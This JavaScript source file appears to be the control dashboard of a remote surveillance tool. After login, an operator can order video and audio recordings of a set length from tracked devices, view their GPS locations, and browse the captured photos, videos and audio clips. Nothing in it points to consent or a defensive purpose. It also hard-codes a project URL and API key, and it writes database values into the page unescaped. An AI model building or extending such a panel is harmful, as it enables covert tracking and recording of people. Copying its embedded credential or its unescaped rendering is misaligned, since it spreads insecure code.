
// Check if Supabase is defined
if (typeof Supabase === 'undefined') {
    console.error('Supabase library not loaded');
} else {
    console.log('Supabase library loaded successfully');
}

const SUPABASE_URL = 'https://ubixfkksdpzmiixynvqq.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InViaXhma2tzZHB6bWlpeHludnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY1NDE3NTUsImV4cCI6MjA2MjExNzc1NX0.yT7aGQvAsYvb9qB2ZiEeK8edeXzs47d0eY94VdfWylc';
const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Debug: Confirm Supabase client initialization
console.log('Supabase client initialized:', supabase);

// Elements
const loginSection = document.getElementById('loginSection');
const mainPanel = document.getElementById('mainPanel');
const emailInput = document.getElementById('emailInput');
const passwordInput = document.getElementById('passwordInput');
const loginBtn = document.getElementById('loginBtn');
const loginStatus = document.getElementById('loginStatus');
const actionSelect = document.getElementById('actionSelect');
const durationInput = document.getElementById('durationInput');
const sendRequestBtn = document.getElementById('sendRequestBtn');
const requestStatus = document.getElementById('requestStatus');
const locationsTableBody = document.getElementById('locationsTableBody');
const mediaFilesContainer = document.getElementById('mediaFilesContainer');

// Debug: Check if DOM elements are found
if (!loginSection) console.error('loginSection not found');
if (!mainPanel) console.error('mainPanel not found');
if (!emailInput) console.error('emailInput not found');
if (!passwordInput) console.error('passwordInput not found');
if (!loginBtn) console.error('loginBtn not found');
if (!loginStatus) console.error('loginStatus not found');
if (!actionSelect) console.error('actionSelect not found');
if (!durationInput) console.error('durationInput not found');
if (!sendRequestBtn) console.error('sendRequestBtn not found');
if (!requestStatus) console.error('requestStatus not found');
if (!locationsTableBody) console.error('locationsTableBody not found');
if (!mediaFilesContainer) console.error('mediaFilesContainer not found');

// Check if already logged in
supabase.auth.getSession().then(({ data: { session } }) => {
    console.log('Session check:', session);
    if (session) {
        showMainPanel();
    }
});

// Login
if (loginBtn) {
    loginBtn.addEventListener('click', async () => {
        console.log('Login button clicked');
        const email = emailInput.value;
        const password = passwordInput.value;

        if (!email || !password) {
            loginStatus.innerHTML = '<span class="text-danger">Please enter email and password.</span>';
            return;
        }

        console.log('Attempting login with email:', email);
        try {
            const { data, error } = await supabase.auth.signInWithPassword({
                email,
                password
            });

            console.log('Login response:', data, error);
            if (error) throw error;

            loginStatus.innerHTML = '<span class="text-success">Logged in successfully!</span>';
            showMainPanel();
        } catch (error) {
            console.error('Login error:', error);
            loginStatus.innerHTML = `<span class="text-danger">Error: ${error.message}</span>`;
        }
    });
} else {
    console.error('Cannot attach event listener to loginBtn because it is null');
}

function showMainPanel() {
    loginSection.style.display = 'none';
    mainPanel.style.display = 'block';
    loadLocations();
    loadMediaFiles();
}

// Send Request
if (sendRequestBtn) {
    sendRequestBtn.addEventListener('click', async () => {
        console.log('Send Request button clicked');
        const action = actionSelect.value;
        const duration = durationInput.value ? parseInt(durationInput.value) : null;

        if (action === 'record_video' || action === 'record_audio') {
            if (!duration || duration <= 0) {
                requestStatus.innerHTML = '<span class="text-danger">Please enter a valid duration.</span>';
                return;
            }
        }

        try {
            const { error } = await supabase
                .from('requests')
                .insert([{ action, duration }]);

            if (error) throw error;

            requestStatus.innerHTML = '<span class="text-success">Request sent successfully!</span>';
            durationInput.value = '';
        } catch (error) {
            console.error('Error sending request:', error);
            requestStatus.innerHTML = `<span class="text-danger">Error: ${error.message}</span>`;
        }
    });
}

// Fetch and Display Locations
async function loadLocations() {
    try {
        const { data, error } = await supabase
            .from('locations')
            .select('*')
            .order('timestamp', { ascending: false });

        if (error) throw error;

        locationsTableBody.innerHTML = '';
        data.forEach(location => {
            const row = `
                <tr>
                    <td>${location.device_id}</td>
                    <td>${location.latitude}</td>
                    <td>${location.longitude}</td>
                    <td>${new Date(location.timestamp).toLocaleString()}</td>
                </tr>
            `;
            locationsTableBody.innerHTML += row;
        });
    } catch (error) {
        console.error('Error loading locations:', error);
    }
}

// Fetch and Display Media Files
async function loadMediaFiles() {
    try {
        const { data, error } = await supabase
            .from('media_files')
            .select('*')
            .order('timestamp', { ascending: false });

        if (error) throw error;

        mediaFilesContainer.innerHTML = '';
        data.forEach(media => {
            let mediaElement = '';
            if (media.file_type.includes('photo')) {
                mediaElement = `<img src="${media.file_url}" alt="${media.file_name}" class="img-fluid">`;
            } else if (media.file_type === 'video') {
                mediaElement = `<video controls class="img-fluid"><source src="${media.file_url}" type="video/mp4"></video>`;
            } else if (media.file_type === 'audio') {
                mediaElement = `<audio controls class="w-100"><source src="${media.file_url}" type="audio/mp3"></audio>`;
            }

            const card = `
                <div class="col-md-4 media-item">
                    <div class="card">
                        <div class="card-body">
                            ${mediaElement}
                            <p class="mt-2"><strong>Type:</strong> ${media.file_type}</p>
                            <p><strong>Device ID:</strong> ${media.device_id}</p>
                            <p><strong>Timestamp:</strong> ${new Date(media.timestamp).toLocaleString()}</p>
                        </div>
                    </div>
                </div>
            `;
            mediaFilesContainer.innerHTML += card;
        });
    } catch (error) {
        console.error('Error loading media files:', error);
    }
}